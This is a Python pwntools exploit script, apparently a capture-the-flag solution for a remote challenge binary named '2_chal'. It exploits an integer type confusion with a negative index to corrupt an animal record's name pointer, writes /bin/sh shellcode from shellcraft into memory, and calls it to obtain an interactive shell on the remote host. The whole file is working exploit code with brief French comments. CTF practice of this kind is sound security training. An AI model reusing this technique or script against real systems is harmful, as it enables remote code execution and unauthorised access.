#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('../dist/2_chal')

io = remote('zoo.serviel.fr', 1234, ssl=True)

io.sendlineafter(b'tom nom ? ', p64(exe.sym['add_custom'])+p64(0xcafe000+8+4))

# Abuse int type confusion and use pointer in the name as a function
io.sendlineafter(b'-> ', str(-0x20 // 8).encode())

# Corrupt the name pointer of the next animal
io.sendlineafter(b'animal: ', b'4') # Size 
# On place un shellcode dans la mémoire
io.sendlineafter(b'animal: ', asm(shellcraft.sh())) # sound
io.sendlineafter(b'animal: ', b'toto') # name

# On a précédemment placé un pointeur vers notre shellcode dans le nom, on l'appelle
io.sendlineafter(b'-> ', str((-0x20 // 8)+1).encode())

io.interactive()